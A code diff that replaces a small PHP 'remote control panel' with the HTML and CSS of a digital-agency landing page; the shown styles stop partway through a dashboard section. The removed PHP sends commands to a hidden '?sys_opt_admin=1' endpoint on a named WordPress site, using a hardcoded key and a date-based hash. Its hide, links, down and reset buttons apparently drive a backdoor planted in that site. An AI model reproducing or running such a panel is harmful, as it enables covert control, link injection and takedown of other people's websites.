@@ -1,67 +1,1096 @@
-<?php
-// Remote Control Panel for WordPress Site
-session_start();
-
-// Target site (apni website ka URL daalo)
-$site_url = 'https://sportfarmas.com/';
-$secret_key = 'mysecretkey123';
-
-// Function to send command via HTTP
-function sendCommand($site, $command, $key) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $site . '/?sys_opt_admin=1');
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'sys_cmd' => $command,
-        'auth' => md5($key . date('Ymd'))
-    ]));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_COOKIE, 'wordpress_test_cookie=WP+Cookie+check');
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    
-    $response = curl_exec($ch);
-    curl_close($ch);
-    return $response;
-}
-
-// Handle button clicks
-if (isset($_POST['action'])) {
-    sendCommand($site_url, $_POST['action'], $secret_key);
-    $message = "Command sent: " . $_POST['action'];
-}
-?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Site Control Panel</title>
-    <style>
-        body { font-family: Arial; margin: 50px; background: #f0f0f0; }
-        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
-        button { padding: 15px 30px; margin: 10px; font-size: 18px; border: none; border-radius: 5px; cursor: pointer; }
-        .btn-hide { background: #ffc107; color: black; }
-        .btn-links { background: #17a2b8; color: white; }
-        .btn-down { background: #dc3545; color: white; }
-        .btn-reset { background: #28a745; color: white; }
-        .message { margin-top: 20px; padding: 10px; border-radius: 5px; background: #d4edda; color: #155724; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vybrex Solutions — Digital Agency</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{font-size:16px;scroll-behavior:smooth;}
+body{font-family:'Plus Jakarta Sans',sans-serif;background:#F8FAFC;color:#0F172A;overflow-x:hidden;cursor:none;}
+a{text-decoration:none;color:inherit;}button{cursor:none;font-family:inherit;}
+img{display:block;max-width:100%;}
+::selection{background:#22C55E;color:#0F172A;}
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-thumb{background:#3B82F6;border-radius:2px;}
+:root{
+  --b:#0F172A;--w:#FFFFFF;--bg:#F8FAFC;--bg2:#EFF6FF;
+  --blue:#3B82F6;--blue2:#2563EB;--green:#22C55E;--green2:#16A34A;
+  --mu:#64748B;--br:rgba(15,23,42,.08);
+}
+#cd{position:fixed;width:9px;height:9px;background:var(--b);border-radius:50%;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);}
+#cr{position:fixed;width:34px;height:34px;border:1.5px solid rgba(15,23,42,.2);border-radius:50%;pointer-events:none;z-index:99998;transform:translate(-50%,-50%);transition:width .3s,height .3s;}
+body.inv #cd{background:var(--green);}body.inv #cr{border-color:rgba(34,197,94,.3);}
+@media(hover:none){#cd,#cr{display:none!important;}*{cursor:auto!important;}}
+#PRE{position:fixed;inset:0;background:var(--b);z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;}
+#PRE-N{font-family:'Bebas Neue',sans-serif;font-size:clamp(80px,15vw,160px);color:var(--green);line-height:1;}
+#PRE-B{width:180px;height:2px;background:rgba(255,255,255,.08);}
+#PRE-F{height:100%;width:0;background:var(--green);transition:width .05s linear;}
+#PRE-L{font-size:9px;letter-spacing:4px;color:rgba(255,255,255,.25);text-transform:uppercase;}
+#PW{position:fixed;inset:0;background:var(--b);z-index:99990;transform:scaleX(0);transform-origin:left;pointer-events:none;}
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;height:66px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;transition:background .3s,box-shadow .3s;}
+nav.scrolled{background:rgba(248,250,252,.97);backdrop-filter:blur(12px);box-shadow:0 1px 0 var(--br);}
+nav.dk{background:rgba(15,23,42,.92);backdrop-filter:blur(12px);}
+.nlogo{display:flex;align-items:center;gap:10px;cursor:none;}
+.nlogo-txt{font-family:'Bebas Neue',sans-serif;font-size:20px;letter-spacing:3px;color:var(--b);transition:color .3s;}
+nav.dk .nlogo-txt{color:var(--w);}
+.nlogo em{color:var(--blue)!important;font-style:normal;}
+.nlinks{display:flex;align-items:center;gap:32px;list-style:none;}
+.nlinks a{font-size:12.5px;font-weight:600;letter-spacing:.5px;color:var(--mu);transition:color .2s;}
+nav.dk .nlinks a{color:rgba(255,255,255,.4);}
+.nlinks a:hover{color:var(--b);}nav.dk .nlinks a:hover{color:var(--w);}
+.ncta{font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:10px 22px;border-radius:2px;background:var(--b);color:var(--w);transition:background .2s;}
+nav.dk .ncta{background:var(--blue);color:var(--w);}
+.ncta:hover{background:#1E293B;}nav.dk .ncta:hover{background:var(--blue2);}
+.nhb{display:none;flex-direction:column;gap:5px;padding:4px;cursor:none;}
+.nhb span{display:block;width:22px;height:2px;background:var(--b);transition:all .3s;}
+nav.dk .nhb span{background:var(--w);}
+#MM{position:fixed;inset:0;background:var(--b);z-index:9999;display:flex;flex-direction:column;justify-content:center;padding:48px;opacity:0;pointer-events:none;transition:opacity .35s;}
+#MM.op{opacity:1;pointer-events:auto;}
+.mmlink{font-family:'Bebas Neue',sans-serif;font-size:clamp(42px,8vw,72px);color:rgba(255,255,255,.15);letter-spacing:2px;border-bottom:1px solid rgba(255,255,255,.05);padding:14px 0;display:block;cursor:none;transition:color .2s;}
+.mmlink:hover{color:var(--blue);}
+.mmx{position:absolute;top:24px;right:40px;font-size:26px;color:rgba(255,255,255,.3);background:none;border:none;transition:color .2s;}
+.mmx:hover{color:var(--w);}
+.sec{padding:112px 64px;}
+.sec-lbl{font-size:10px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--mu);margin-bottom:20px;display:flex;align-items:center;gap:10px;}
+.sec-lbl::before{content:'';display:block;width:20px;height:2px;background:var(--green);}
+.sec-title{font-family:'Bebas Neue',sans-serif;font-size:clamp(52px,7vw,100px);line-height:.92;letter-spacing:1px;color:var(--b);}
+.sec-title-w{font-family:'Bebas Neue',sans-serif;font-size:clamp(52px,7vw,100px);line-height:.92;letter-spacing:1px;color:var(--w);}
+.sec-title span,.sec-title-w span{color:var(--blue);}
+.rv{opacity:0;transform:translateY(24px);transition:opacity .65s,transform .65s;}
+.rv.in{opacity:1;transform:none;}
+
+/* ── HERO ── */
+#hero{min-height:100vh;background:var(--b);display:flex;flex-direction:column;justify-content:flex-end;padding:0 64px 72px;position:relative;overflow:hidden;}
+.hero-bg{position:absolute;top:50%;left:64px;transform:translateY(-50%);font-family:'Bebas Neue',sans-serif;font-size:clamp(160px,28vw,380px);color:rgba(255,255,255,.025);line-height:1;pointer-events:none;letter-spacing:-4px;user-select:none;white-space:nowrap;}
+.hero-tag{font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:rgba(255,255,255,.3);margin-bottom:28px;display:flex;align-items:center;gap:12px;}
+.hero-tag::before{content:'';display:block;width:28px;height:1px;background:var(--blue);}
+.hero-h{font-family:'Bebas Neue',sans-serif;font-size:clamp(72px,12vw,180px);line-height:.88;letter-spacing:1px;color:var(--w);}
+.hero-h .blue{color:var(--blue);}
+.hero-h .out{-webkit-text-stroke:1.5px rgba(255,255,255,.2);color:transparent;}
+.hero-bot{display:flex;align-items:flex-end;justify-content:space-between;margin-top:56px;gap:24px;flex-wrap:wrap;}
+.hero-sub{font-size:15px;color:rgba(255,255,255,.38);line-height:1.75;max-width:360px;font-weight:400;}
+.hero-btns{display:flex;gap:14px;flex-wrap:wrap;}
+.hbtn{font-size:11px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;padding:14px 32px;border-radius:2px;cursor:none;transition:all .22s;}
+.hbtn-p{background:var(--blue);color:var(--w);}
+.hbtn-p:hover{background:var(--blue2);}
+.hbtn-s{background:transparent;border:1.5px solid rgba(255,255,255,.15);color:rgba(255,255,255,.5);}
+.hbtn-s:hover{border-color:rgba(255,255,255,.4);color:var(--w);}
+
+/* ── CLIENT LOGO TICKER ── */
+.ticker{background:var(--w);padding:20px 0;overflow:hidden;border-top:1px solid var(--br);border-bottom:1px solid var(--br);}
+.t-track{display:flex;gap:64px;width:max-content;animation:tick 28s linear infinite;align-items:center;}
+.t-logo{
+  height:36px;width:auto;max-width:120px;
+  object-fit:contain;filter:grayscale(1) opacity(.35);
+  transition:filter .3s;flex-shrink:0;
+}
+.t-logo:hover{filter:grayscale(0) opacity(1);}
+.t-logo-txt{
+  font-family:'Bebas Neue',sans-serif;font-size:18px;letter-spacing:2px;
+  color:rgba(15,23,42,.2);white-space:nowrap;flex-shrink:0;
+  transition:color .3s;
+}
+.t-logo-txt:hover{color:var(--blue);}
+@keyframes tick{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ── ABOUT ── */
+#about{background:var(--bg);}
+.about-grid{display:grid;grid-template-columns:1fr 1.2fr;gap:80px;align-items:start;max-width:1200px;margin:0 auto;}
+.about-body{font-size:15.5px;color:var(--mu);line-height:1.8;margin-top:28px;max-width:440px;}
+.stats{display:flex;flex-direction:column;gap:0;}
+.stat{padding:28px 0;border-bottom:1px solid var(--br);display:flex;align-items:baseline;gap:20px;}
+.stat:first-child{padding-top:0;}
+.snum{font-family:'Bebas Neue',sans-serif;font-size:clamp(56px,6vw,84px);color:var(--b);line-height:1;letter-spacing:-1px;}
+.snum em{font-family:'Plus Jakarta Sans',sans-serif;font-size:.45em;color:var(--blue);font-style:normal;}
+.slbl{font-size:12px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--b);}
+.ssub{font-size:12.5px;color:var(--mu);margin-top:4px;}
+
+/* ── SERVICES ── */
+#services{background:var(--b);padding:112px 0;}
+.svc-inner{padding:0 64px;}
+.svc-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:56px;gap:32px;max-width:1300px;margin-left:auto;margin-right:auto;}
+.svc-sub{font-size:14px;color:rgba(255,255,255,.3);line-height:1.7;max-width:280px;text-align:right;}
+.svc-grid{display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid rgba(255,255,255,.07);max-width:1300px;margin:0 auto;}
+.sc{padding:40px 32px;border-right:1px solid rgba(255,255,255,.07);border-bottom:1px solid rgba(255,255,255,.07);position:relative;cursor:none;transition:background .3s;overflow:hidden;}
+.sc:hover{background:rgba(255,255,255,.03);}
+.sc:nth-child(4n){border-right:none;}
+.sc-n{font-family:'Bebas Neue',sans-serif;font-size:11px;letter-spacing:3px;color:rgba(255,255,255,.15);margin-bottom:28px;}
+.sc-ico{font-size:28px;margin-bottom:20px;}
+.sc-name{font-size:14.5px;font-weight:700;color:var(--w);margin-bottom:10px;}
+.sc-desc{font-size:12.5px;color:rgba(255,255,255,.3);line-height:1.7;}
+.sc-price{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--green);margin-top:20px;padding-top:18px;border-top:1px solid rgba(255,255,255,.07);}
+.sc-arr{position:absolute;bottom:28px;right:28px;font-size:18px;color:rgba(255,255,255,.08);transition:all .3s;}
+.sc:hover .sc-arr{color:var(--blue);transform:translate(3px,-3px);}
+
+/* ── PROCESS ── */
+#process{background:var(--bg2);}
+.proc-grid{display:flex;gap:0;border:1px solid var(--br);max-width:1200px;margin-top:56px;margin-left:auto;margin-right:auto;}
+.proc-step{flex:1;padding:40px 28px;border-right:1px solid var(--br);position:relative;cursor:none;transition:background .3s;}
+.proc-step:last-child{border-right:none;}
+.proc-step:hover{background:var(--bg);}
+.proc-num{font-family:'Bebas Neue',sans-serif;font-size:52px;color:rgba(15,23,42,.07);line-height:1;margin-bottom:20px;}
+.proc-name{font-size:13px;font-weight:700;letter-spacing:.5px;color:var(--b);margin-bottom:8px;}
+.proc-desc{font-size:12.5px;color:var(--mu);line-height:1.65;}
+.proc-dot{position:absolute;top:32px;right:28px;width:7px;height:7px;background:var(--green);border-radius:50%;}
+
+/* ── PORTFOLIO ── */
+#portfolio{background:var(--w);padding:112px 64px;}
+.port-inner{max-width:1200px;margin:0 auto;}
+.port-top{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:40px;gap:24px;flex-wrap:wrap;}
+.pfilters{display:flex;gap:8px;flex-wrap:wrap;}
+.pf{font-size:10.5px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:8px 18px;border:1.5px solid var(--br);border-radius:2px;background:transparent;color:var(--mu);cursor:none;transition:all .2s;}
+.pf.on,.pf:hover{background:var(--b);border-color:var(--b);color:var(--blue);}
+#pgrid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;margin-top:8px;}
+.pcard{position:relative;aspect-ratio:4/3;overflow:hidden;cursor:none;background:var(--bg2);}
+.pcard-ph{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:48px;transition:transform .5s;}
+.pcard-img-el{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transition:transform .5s;}
+.pcard:hover .pcard-ph,.pcard:hover .pcard-img-el{transform:scale(1.05);}
+.pcard-ov{position:absolute;inset:0;background:rgba(15,23,42,.88);display:flex;flex-direction:column;justify-content:flex-end;padding:28px;opacity:0;transition:opacity .3s;}
+.pcard:hover .pcard-ov{opacity:1;}
+.pcard-cat{font-size:9.5px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--green);margin-bottom:7px;}
+.pcard-name{font-family:'Bebas Neue',sans-serif;font-size:24px;color:var(--w);letter-spacing:.5px;margin-bottom:10px;}
+.pcard-view{font-size:10px;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.35);display:flex;align-items:center;gap:8px;}
+.pcard-view::after{content:'→';color:var(--blue);}
+
+/* Portfolio popup */
+#PPO{position:fixed;inset:0;z-index:9999;background:rgba(15,23,42,.9);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s;}
+#PPO.op{opacity:1;pointer-events:auto;}
+.pp-box{background:var(--w);max-width:860px;width:100%;max-height:88vh;overflow-y:auto;border-radius:3px;display:grid;grid-template-columns:1fr 1fr;transform:translateY(20px);transition:transform .35s;}
+#PPO.op .pp-box{transform:none;}
+.pp-left{background:var(--bg2);min-height:380px;display:flex;align-items:center;justify-content:center;font-size:60px;position:relative;overflow:hidden;}
+.pp-left img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;}
+.pp-right{padding:44px 40px;display:flex;flex-direction:column;position:relative;}
+.ppx{position:absolute;top:18px;right:18px;width:32px;height:32px;background:var(--bg2);border:none;border-radius:50%;cursor:none;font-size:14px;display:flex;align-items:center;justify-content:center;}
+.pp-cat{font-size:9px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--mu);margin-bottom:14px;}
+.pp-title{font-family:'Bebas Neue',sans-serif;font-size:clamp(28px,3.5vw,44px);color:var(--b);letter-spacing:.5px;line-height:1;margin-bottom:16px;}
+.pp-desc{font-size:13.5px;color:var(--mu);line-height:1.75;flex:1;}
+.pp-tags{display:flex;gap:7px;flex-wrap:wrap;margin:18px 0;}
+.pp-tag{font-size:9.5px;font-weight:600;letter-spacing:1px;padding:5px 11px;border:1px solid var(--br);color:var(--mu);border-radius:2px;}
+.pp-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:auto;}
+.ppbtn{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:11px 22px;border-radius:2px;cursor:none;transition:all .2s;}
+.ppbtn-p{background:var(--b);color:var(--w);}
+.ppbtn-p:hover{background:#1E293B;}
+.ppbtn-s{background:transparent;border:1.5px solid var(--br);color:var(--mu);}
+.ppbtn-s:hover{border-color:var(--b);color:var(--b);}
+
+/* ── TEAM ── */
+#team{background:var(--bg);}
+.team-heads-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;margin-top:56px;max-width:1200px;margin-left:auto;margin-right:auto;}
+.tc{background:var(--w);position:relative;cursor:none;transition:background .3s;overflow:hidden;display:flex;flex-direction:column;}
+.tc-photo-wrap{width:100%;aspect-ratio:4/5;overflow:hidden;background:var(--b);position:relative;flex-shrink:0;}
+.tc-photo{width:100%;height:100%;object-fit:cover;object-position:top;display:block;transition:transform .6s;}
+.tc:hover .tc-photo{transform:scale(1.03);}
+.tc-photo-ph{width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:var(--b);position:relative;}
+.tc-photo-init{font-family:'Bebas Neue',sans-serif;font-size:clamp(80px,12vw,140px);color:rgba(59,130,246,.12);letter-spacing:4px;}
+.tc-upload-ov{position:absolute;inset:0;background:rgba(15,23,42,.75);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:8px;opacity:0;transition:opacity .3s;cursor:none;}
+.tc-upload-ov.show{opacity:1;}
+.tc-upload-lbl{font-family:'Bebas Neue',sans-serif;font-size:14px;letter-spacing:2px;color:var(--w);}
+.tc-content{padding:36px 40px;flex:1;}
+.tc-name{font-family:'Bebas Neue',sans-serif;font-size:clamp(32px,4vw,52px);color:var(--b);letter-spacing:.5px;margin-bottom:4px;}
+.tc-role{font-size:10.5px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--blue);margin-bottom:20px;}
+.tc-bio{font-size:14px;color:var(--mu);line-height:1.75;max-width:360px;}
+.tc-skills{display:flex;gap:8px;flex-wrap:wrap;margin-top:22px;}
+.tc-skill{font-size:9.5px;font-weight:600;letter-spacing:1px;padding:5px 12px;border:1px solid var(--br);color:var(--mu);border-radius:2px;}
+
+/* Team members sub-grid */
+#team-sub{background:var(--bg2);padding:80px 64px;}
+.tm-sub-inner{max-width:1200px;margin:0 auto;}
+.tm-sub-lbl{font-size:10px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--mu);margin-bottom:40px;display:flex;align-items:center;gap:10px;}
+.tm-sub-lbl::before{content:'';display:block;width:20px;height:2px;background:var(--green);}
+.tm-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;}
+.tmcard{background:var(--w);overflow:hidden;cursor:none;transition:transform .3s;position:relative;}
+.tmcard:hover{transform:translateY(-4px);}
+.tmcard-photo{width:100%;aspect-ratio:1/1;overflow:hidden;background:var(--b);}
+.tmcard-photo img{width:100%;height:100%;object-fit:cover;object-position:top;transition:transform .5s;}
+.tmcard:hover .tmcard-photo img{transform:scale(1.04);}
+.tmcard-photo-ph{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-family:'Bebas Neue',sans-serif;font-size:52px;color:rgba(59,130,246,.18);}
+.tmcard-info{padding:20px 24px 24px;}
+.tmcard-name{font-family:'Bebas Neue',sans-serif;font-size:20px;color:var(--b);letter-spacing:.5px;margin-bottom:3px;}
+.tmcard-role{font-size:10.5px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--blue);margin-bottom:0;}
+.tm-del-btn{position:absolute;top:8px;right:8px;width:26px;height:26px;background:rgba(15,23,42,.75);color:var(--w);border:none;border-radius:50%;cursor:none;font-size:10px;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .2s;}
+.tmcard:hover .tm-del-btn{opacity:1;}
+.tm-add-card{background:var(--bg);border:2px dashed var(--br);display:none;flex-direction:column;align-items:center;justify-content:center;gap:12px;cursor:none;min-height:280px;transition:border-color .2s;}
+.tm-add-card:hover{border-color:var(--blue);}
+.tm-add-ico{font-size:32px;color:var(--mu);}
+.tm-add-lbl{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--mu);}
+
+/* ── VIDEO TESTIMONIALS ── */
+#vtesti{background:var(--b);padding:112px 64px;}
+.vt-inner{max-width:1200px;margin:0 auto;}
+.vt-top{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:56px;flex-wrap:wrap;gap:24px;}
+.vt-add-btn{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:10px 22px;background:var(--blue);color:var(--w);border:none;border-radius:2px;cursor:none;transition:background .2s;display:none;}
+.vt-add-btn:hover{background:var(--blue2);}
+.vt-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;}
+.vtcard{position:relative;border-radius:4px;overflow:hidden;cursor:none;background:#1E293B;}
+.vt-aspect{position:relative;width:100%;padding-bottom:177.77%;background:#1E293B;}
+.vt-vid{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block;}
+.vt-ph{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;background:#1E293B;color:var(--mu);}
+.vt-ph-ico{font-size:40px;}
+.vt-ph-txt{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.25);}
+.vt-play{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(15,23,42,.35);opacity:1;transition:opacity .3s;}
+.vtcard:hover .vt-play{opacity:0;}
+.vt-play-btn{width:58px;height:58px;border-radius:50%;background:var(--green);display:flex;align-items:center;justify-content:center;pointer-events:none;}
+.vt-play-btn::after{content:'';border-style:solid;border-width:10px 0 10px 18px;border-color:transparent transparent transparent var(--b);margin-left:4px;}
+.vt-info{padding:16px 20px;background:#1E293B;}
+.vt-name{font-size:13px;font-weight:700;color:var(--w);margin-bottom:3px;}
+.vt-role{font-size:11px;color:rgba(255,255,255,.35);}
+.vt-del-btn{position:absolute;top:10px;right:10px;width:28px;height:28px;border-radius:50%;background:rgba(15,23,42,.8);color:var(--w);border:none;cursor:none;font-size:10px;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .2s;z-index:10;}
+.vtcard:hover .vt-del-btn{opacity:1;}
+.vt-empty{grid-column:1/-1;padding:64px 0;text-align:center;font-size:14px;color:rgba(255,255,255,.25);}
+
+/* Video play modal */
+#VPLAY{position:fixed;inset:0;z-index:99999;background:rgba(15,23,42,.97);backdrop-filter:blur(12px);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
+#VPLAY.op{opacity:1;pointer-events:auto;}
+.vplay-inner{width:min(360px,88vw);position:relative;}
+.vplay-video{width:100%;aspect-ratio:9/16;border-radius:3px;background:var(--b);display:block;}
+.vplay-close{position:absolute;top:-16px;right:-16px;width:36px;height:36px;border-radius:50%;background:var(--w);border:none;cursor:none;font-size:14px;display:flex;align-items:center;justify-content:center;}
+.vplay-name{text-align:center;margin-top:14px;font-size:13px;font-weight:700;color:var(--w);}
+.vplay-role{text-align:center;font-size:11px;color:rgba(255,255,255,.4);margin-top:3px;}
+
+/* ── TESTIMONIALS (text) ── */
+#testimonials{background:var(--bg2);padding:112px 64px;}
+.tst-inner{max-width:1200px;margin:0 auto;}
+.tst-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;margin-top:56px;}
+.tcard{background:var(--w);padding:40px 36px;border-right:1px solid var(--br);transition:background .3s;}
+.tcard:last-child{border-right:none;}
+.tcard:hover{background:var(--bg);}
+.tcard-stars{color:var(--green);font-size:13px;letter-spacing:3px;margin-bottom:22px;}
+.tcard-q{font-size:16px;color:var(--mu);line-height:1.7;margin-bottom:28px;font-style:italic;font-weight:300;}
+.tcard-q::before{content:'\201C';}
+.tcard-q::after{content:'\201D';}
+.tcard-sep{width:20px;height:1.5px;background:var(--br);margin-bottom:20px;}
+.tcard-name{font-size:12px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--b);}
+.tcard-role{font-size:11.5px;color:var(--mu);margin-top:4px;}
+
+/* ── PRICING ── */
+#pricing{background:var(--w);padding:112px 64px;}
+.price-inner{max-width:1100px;margin:0 auto;}
+.price-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;margin-top:56px;}
+.pcard{padding:48px 40px;border:1.5px solid var(--br);position:relative;transition:border-color .3s;}
+.pcard:hover{border-color:var(--b);}
+.pcard.feat{background:var(--b);border-color:var(--b);}
+.pbadge{position:absolute;top:22px;right:22px;font-size:8.5px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:4px 10px;background:var(--green);color:var(--b);border-radius:1px;}
+.pname{font-size:10px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--mu);margin-bottom:16px;}
+.pcard.feat .pname{color:rgba(255,255,255,.35);}
+.pamount{font-family:'Bebas Neue',sans-serif;font-size:clamp(50px,5vw,72px);color:var(--b);line-height:1;margin-bottom:6px;letter-spacing:-1px;}
+.pcard.feat .pamount{color:var(--blue);}
+.pper{font-size:12.5px;color:var(--mu);margin-bottom:32px;}
+.pcard.feat .pper{color:rgba(255,255,255,.3);}
+.pfeats{list-style:none;margin-bottom:36px;}
+.pfeat{font-size:13px;color:var(--mu);padding:10px 0;border-bottom:1px solid var(--br);display:flex;align-items:center;gap:10px;}
+.pcard.feat .pfeat{color:rgba(255,255,255,.45);border-bottom-color:rgba(255,255,255,.07);}
+.pfeat::before{content:'→';color:var(--blue);font-size:11px;flex-shrink:0;}
+.pbtn{display:block;width:100%;text-align:center;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:14px;border-radius:2px;cursor:none;transition:all .22s;}
+.pbtn-d{background:var(--b);color:var(--w);}
+.pbtn-d:hover{background:#1E293B;}
+.pbtn-l{background:var(--blue);color:var(--w);}
+.pbtn-l:hover{background:var(--blue2);}
+
+/* ── CONTACT ── */
+#contact{background:var(--bg);padding:112px 64px;}
+.contact-inner{display:grid;grid-template-columns:1fr 1fr;gap:80px;max-width:1200px;margin:0 auto;align-items:start;}
+.contact-info{display:flex;flex-direction:column;gap:32px;margin-top:40px;}
+.ci{display:flex;gap:20px;align-items:flex-start;}
+.ci-ico{width:44px;height:44px;background:var(--b);border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;}
+.ci-lbl{font-size:9px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--mu);margin-bottom:4px;}
+.ci-val{font-size:14px;color:var(--b);font-weight:500;}
+.ci-val a{color:var(--b);transition:color .2s;}
+.ci-val a:hover{color:var(--mu);}
+.cform{display:flex;flex-direction:column;gap:18px;}
+.crow{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.cg{display:flex;flex-direction:column;gap:8px;}
+.clbl{font-size:9px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;color:var(--mu);}
+.cinp,.csel,.cta{border:1.5px solid var(--br);border-radius:2px;background:var(--w);color:var(--b);font-family:'Plus Jakarta Sans',sans-serif;font-size:14px;padding:13px 15px;outline:none;transition:border-color .2s;width:100%;}
+.cinp:focus,.csel:focus,.cta:focus{border-color:var(--b);}
+.csel{appearance:none;cursor:none;}
+.cta{resize:vertical;min-height:110px;line-height:1.6;}
+.csub{font-size:11px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;padding:15px 36px;background:var(--b);color:var(--w);border:none;border-radius:2px;cursor:none;align-self:flex-start;transition:background .22s;}
+.csub:hover{background:#1E293B;}
+
+/* ── FOOTER ── */
+footer{background:var(--b);padding:60px 64px 40px;}
+.ftop{display:flex;justify-content:space-between;align-items:flex-start;gap:48px;padding-bottom:48px;border-bottom:1px solid rgba(255,255,255,.06);flex-wrap:wrap;}
+.flogo{font-family:'Bebas Neue',sans-serif;font-size:20px;letter-spacing:3px;color:var(--w);margin-bottom:12px;}
+.flogo em{color:var(--blue);font-style:normal;}
+.ftag{font-size:13px;color:rgba(255,255,255,.25);line-height:1.65;max-width:240px;}
+.fcol-title{font-size:9px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:rgba(255,255,255,.2);margin-bottom:18px;}
+.flink{display:block;font-size:13px;color:rgba(255,255,255,.35);margin-bottom:11px;transition:color .2s;cursor:none;}
+.flink:hover{color:var(--w);}
+.fbot{display:flex;justify-content:space-between;align-items:center;padding-top:28px;gap:24px;flex-wrap:wrap;}
+.fcopy{font-size:10px;letter-spacing:1.5px;color:rgba(255,255,255,.18);text-transform:uppercase;}
+.fsocs{display:flex;gap:12px;}
+.fsoc{width:34px;height:34px;border:1px solid rgba(255,255,255,.1);border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:rgba(255,255,255,.3);cursor:none;transition:all .2s;}
+.fsoc:hover{border-color:var(--blue);color:var(--blue);}
+
+/* ── DASHBOARD ── */
+#DASH{display:none;position:fixed;inset:0;z-index:9990;flex-direction:column;background:var(--bg);}
+#DASH.op{display:flex;}
+.dh{background:var(--b);padding:18px 40px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.dh-title{font-family:'Bebas Neue',sans-serif;font-size:18px;letter-spacing:3px;color:var(--blue);}
+.dh-back{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.35);background:none;border:none;transition:color .2s;}
+.dh-back:hover{color:var(--w);}
+.db{padding:32px 40px;flex:1;overflow-y:auto;}
+.dstats{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:28px;}
+.dstat{background:var(--w);padding:24px;border:1px solid var(--br);}
+.dstat-n{font-family:'Bebas Neue',sans-serif;font-size:48px;color:var(--b);}
+.dstat-l{font-size:9.5px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--mu);margin-top:4px;}
+.dpanel{background:var(--w);border:1px solid var(--br);margin-bottom:16px;}
+.dph{padding:16px 24px;border-bottom:1px solid var(--br);display:flex;align-items:center;justify-content:space-between;font-size:10.5px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--b);}
